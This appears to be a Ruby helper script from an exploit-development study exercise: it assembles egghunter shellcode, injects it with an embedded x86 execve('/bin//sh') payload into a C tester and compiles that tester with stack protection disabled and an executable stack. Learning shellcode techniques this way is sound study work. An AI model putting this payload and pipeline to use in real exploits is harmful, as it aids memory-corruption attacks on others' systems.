#!/usr/bin/env ruby
# Author: Jason Villaluna

require 'optparse'

# Default payload to use if nothing is pass
# execve(/bin//sh, NULL, NULL)
PAYLOAD = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50'\
          '\x53\x89\xe1\xb0\x0b\xcd\x80'.freeze

def run
  parse_args
  get_egghunter
  compile_nasm
  @egghunter_shellcode = generate_shellcode
  replace_shellcode
  compile_binary
rescue OptionParser::MissingArgument
  puts "Missing argument:"
  @parser.parse %w[--help]
rescue StandardError => e
  puts "An error #{e.inspect} occurred"
  exit(1)
end

# Map the egghunter's filename to use
def get_egghunter
  egghunters = [
    'egghunter_access',
    'egghunter_access_revisited',
    'egghunter_sigaction',
    'egghunter_access_mod'
  ]
  @filename = egghunters[@egghunter - 1]
end

# Compile the nasm code
def compile_nasm
  `nasm -f elf32 -o #{@filename}.o #{@filename}.nasm`
  `ld -m elf_i386 -s -o #{@filename} #{@filename}.o`
end

# Generate shellcode using objdump
def generate_shellcode
  objdump = `objdump -d #{@filename}`
  objdump.split("\n").map { |line| line.split("\t")[1] }
    .compact.map(&:split).join('\x').prepend('\x')
end

# Replace a value inside a file
def replace_content(filename)
  file_content = File.read(filename)
  yield(file_content)
  File.write(filename, file_content)
end

# Replace shellcode in the shellcode tester program
def replace_shellcode
  replace_content('./shellcode.c') do |c_code|
    egg = @egghunter == 3 ? 'JSNVJSNV' : '\x90\x50\x90\x50'
    payload = egg + (@payload || PAYLOAD)
    c_code.gsub!(/egghunter\[\] = \"\S+\"\;/,
                 "egghunter[] = \"#{@egghunter_shellcode}\"\;")
    c_code.gsub!(/egg\[\] = \"\S+\"\;/, "egg[] = \"#{payload}\"\;")
  end
end

# Compile the shellcode into binary with the help of the shellcode.c program
def compile_binary
  `gcc -fno-stack-protector -m32 -z execstack shellcode.c -o shellcode 2> /dev/null`
end

def parse_args
  @parser = OptionParser.new do |opts|
    opts.banner = "Usage: #{$0} [options]"
    opts.separator ""
    opts.separator "Options:"

    opts.on("--egghunter", "-e EGGHUNTER_NUMBER",
            "\n\t\tPick which egghunter to use:\n\t\t1: access(2)\n\t\t2: "\
            "access(2) revisited\n\t\t3: sigaction(2)\n\t\t4: modified") do |value|
              @egghunter = value.to_i
    end

    opts.on("--payload", "-p SHELLCODE_PAYLOAD",
            "Payload to be added. Default: '/bin/sh'") do |value|
              @payload = value
    end

    opts.on_tail("--help", "-h", "Print options") do |show_help|
      warn opts
      exit(0)
    end
  end
  @parser.parse!
end

if __FILE__ == $PROGRAM_NAME
  run
  puts "Successfully generated \e[32mshellcode\e[0m binary!"
end
